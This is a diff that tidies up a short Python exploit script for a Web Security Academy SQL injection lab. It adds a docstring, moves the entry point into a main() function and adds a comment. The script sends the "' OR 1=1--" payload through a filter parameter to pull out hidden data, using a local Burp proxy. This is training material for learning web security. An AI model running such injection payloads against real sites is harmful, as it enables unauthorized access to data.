@@ -1,6 +1,27 @@
+#!/usr/bin/env python3
+
+"""
+Python script for Web-Security-Academy SQLi lab 01
+
+SYNOPSIS
+========
+
+::
+
+  ./sqli-01.py https://web-security-academy.net "' OR 1=1 --
+
+DESCRIPTION
+===========
+SQLi exploit script used to retrieve hidden data.
+paylod used in Burp Repeater
+' OR 1=1--
+GET /filter?category=Accessories'+OR+1%3d1--
+running the exploit/script will look like this:
+"""
 import requests
 import sys
 import urllib3
+# disable insecure request warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
@@ -13,7 +34,7 @@ def exploit_sqli(url, payload):
     else:
         return False
 
-if __name__ == "__main__":
+def main():
     try:
         url = sys.argv[1].strip()
         payload = sys.argv[2].strip()
@@ -26,3 +47,8 @@ if __name__ == "__main__":
         print("[+] SQL injection successful!")
     else:
         print("[-] SQL injection unsuccessful!")
+
+
+if __name__ == "__main__":
+    main()
+
